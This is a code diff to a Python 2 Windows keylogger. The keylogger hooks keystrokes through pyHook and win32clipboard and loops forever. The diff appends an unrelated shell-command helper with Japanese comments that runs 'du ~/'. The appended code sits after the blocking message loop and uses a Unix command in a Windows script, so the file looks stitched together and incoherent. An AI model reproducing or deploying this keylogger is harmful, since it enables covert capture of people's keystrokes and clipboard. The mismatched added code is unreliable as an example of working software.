@@ -1,8 +1,10 @@
-from ctypes import *
+﻿from ctypes import *
 import pythoncom
 import pyHook 
 import win32clipboard
 import sys
+import subprocess
+
 
 user32   = windll.user32
 kernel32 = windll.kernel32
@@ -83,3 +85,31 @@ kl.KeyDown = KeyStroke
 # register the hook and execute forever
 kl.HookKeyboard()
 pythoncom.PumpMessages()
+
+
+def run_and_capture(cmd):
+    '''
+    :param cmd: str 実行するコマンド.
+    :rtype: str
+    :return: 標準出力.
+    '''
+    # ここでプロセスが (非同期に) 開始する.
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    buf = []
+
+    while True:
+        # バッファから1行読み込む.
+        line = proc.stdout.readline()
+        buf.append(line)
+        sys.stdout.write(line)
+
+        # バッファが空 + プロセス終了.
+        if not line and proc.poll() is not None:
+            break
+
+    return ''.join(buf)
+
+
+if __name__ == '__main__':
+    msg = run_and_capture('du ~/')
+    print msg
